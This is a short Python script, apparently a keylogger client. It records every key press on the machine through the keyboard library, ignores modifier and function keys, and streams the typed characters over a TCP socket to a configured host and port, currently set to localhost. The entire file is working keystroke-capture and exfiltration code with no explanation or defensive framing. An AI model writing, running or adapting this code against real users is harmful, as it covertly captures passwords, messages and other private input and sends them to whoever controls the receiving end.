import socket
import keyboard

HOST = '127.0.0.1'
PORT = 65432

keys_to_ignore = [
    'shift', 'shift_r', 'alt', 'alt_r', 'ctrl', 'ctrl_r', 'capslock', 'tab',
    'esc', 'left', 'right', 'up', 'down', 'home', 'end', 'page up', 'page down',
    'insert', 'delete', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10',
    'f11', 'f12', 'print screen', 'scroll lock', 'pause', 'numlock'
]

def send_key_presses():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            key_event = keyboard.read_event()
            if key_event.event_type == keyboard.KEY_DOWN:
                key = key_event.name
                if key in keys_to_ignore:
                    continue
                elif key == 'enter':
                    key = '\n'
                elif key == 'backspace':
                    key = '\b \b'
                elif key == 'space':
                    key = ' '
                elif keyboard.is_pressed('shift'):
                    key = key.upper()
                s.sendall(key.encode())

if __name__ == "__main__":
    send_key_presses()
